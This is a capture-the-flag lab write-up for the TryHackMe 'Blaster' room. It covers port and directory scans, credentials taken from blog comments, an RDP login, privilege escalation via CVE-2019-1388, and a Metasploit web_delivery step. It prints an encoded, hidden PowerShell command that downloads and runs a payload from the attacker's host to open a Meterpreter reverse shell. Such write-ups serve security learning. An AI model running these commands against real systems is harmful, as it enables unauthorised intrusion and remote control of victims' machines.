# TryHackMe Blaster writeup

--- 

## `Nmap` scan

```ruby
 sudo nmap -sCV -Pn 10.10.2.126
```

`-Pn` forces nmap to assume that the target is up and start scanning the ports immediately. If ports appear, the target is only rejecting the ping.

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-23 14:06 EDT
Nmap scan report for 10.10.2.126
Host is up (0.091s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-10-23T18:07:22+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2025-10-22T18:01:39
|_Not valid after:  2026-04-23T18:01:39
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2025-10-23T18:07:18+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.09 seconds

```

## `Gobuster`

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.2.126 
```

<img width="1093" height="352" alt="image" src="https://github.com/user-attachments/assets/707c85c7-1dd0-42bd-99fe-46d6bdfc93e8" />

----

<img width="1189" height="572" alt="image" src="https://github.com/user-attachments/assets/183aae96-56b1-44b8-aebe-3ca0bc096506" />

```
wade
```

----

> ### on comments of wade posts found 

<img width="876" height="370" alt="image" src="https://github.com/user-attachments/assets/ac088473-10be-49a9-bc8c-70eaad8f1d9f" />

```
parzival
```

---

## `login to sys`

```
rdesktop 10.10.2.126 -u wade -p parzival 
```

<img width="1489" height="751" alt="image" src="https://github.com/user-attachments/assets/2c1b5d57-a3be-4ff2-a78c-54eee57b59d7" />

```
THM{HACK_PLAYER_ONE}
```

---

> ## after some searching i opened internet explorer found

<img width="759" height="376" alt="image" src="https://github.com/user-attachments/assets/d94dbd20-fe95-4e9d-ba6b-6a574491707d" />

```
CVE-2019-1388
```

---

<img width="730" height="354" alt="image" src="https://github.com/user-attachments/assets/841a5c43-d3a4-4f6a-9c9d-86b53b1bc0fc" />

<img width="1493" height="649" alt="image" src="https://github.com/user-attachments/assets/cab06a6e-a6fa-4796-9cb9-27478d3c144a" />

<img width="865" height="594" alt="image" src="https://github.com/user-attachments/assets/ec4e2ace-a9d1-4d1a-b1a4-19625caa8bc8" />

<img width="957" height="685" alt="image" src="https://github.com/user-attachments/assets/ff3cf734-d9eb-456e-b592-7555b25601f1" />

<img width="905" height="625" alt="image" src="https://github.com/user-attachments/assets/4478101f-3fb1-47f7-933f-a389fe70baad" />

<img width="978" height="626" alt="image" src="https://github.com/user-attachments/assets/99fd737b-f870-4a50-afdc-b0d7b3b76e10" />

```
C:\windows\System32\cmd.exe
```

<img width="942" height="585" alt="image" src="https://github.com/user-attachments/assets/c86dddbf-6c9a-4201-a220-135d30a875b3" />

<img width="857" height="416" alt="image" src="https://github.com/user-attachments/assets/434e4bec-7b4e-496f-ab8e-10521431079b" />

<img width="780" height="259" alt="image" src="https://github.com/user-attachments/assets/40c35744-2fa4-458a-8f21-5569de201355" />

```
THM{COIN_OPERATED_EXPLOITATION}
```

----

## Use **`metasploit`**

```
msfconsole
use exploit/multi/script/web_delivery
show targets
```

<img width="727" height="369" alt="image" src="https://github.com/user-attachments/assets/150ecc1b-338b-4368-a8fb-28af1a0e466a" />

```
set target 2
```

<img width="953" height="418" alt="image" src="https://github.com/user-attachments/assets/7ddf73c8-71ff-4b50-ba94-20d628a136a1" />

```
set lhost 10.10.10.10
set rhost 443
set payload windows/meterpreter/reverse_http
run -j
```

<img width="1121" height="379" alt="image" src="https://github.com/user-attachments/assets/9e7d4302-8a09-41ef-9a46-62bdfb021da5" />

## reverse shell

> ### put this on powershell or cmd that we have the `nt authority\system` on it 

```
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB5AEkAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAeQBJAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAeQBJAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOAAuADQANwAuADEAMAAyADoAOAAwADgAMAAvAEMAUQBFAE8AYQBJAGIAZwBOAC8AagBYAEkAVgBIAFMANQBTACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgA4AC4ANAA3AC4AMQAwADIAOgA4ADAAOAAwAC8AQwBRAEUATwBhAEkAYgBnAE4AJwApACkAOwA=
```

<img width="1579" height="589" alt="image" src="https://github.com/user-attachments/assets/bbb0a8d7-5ed2-4a1a-ba43-b22dddd36e60" />

```ruby
[*] Meterpreter session 1 opened (10.8.47.102:443 -> 10.10.2.126:50155) at 2025-10-23 16:51:07 -0400
```

```
getuid
```

<img width="1124" height="219" alt="image" src="https://github.com/user-attachments/assets/a6dc8360-c179-4eaa-ad39-385cd6ad6e47" />

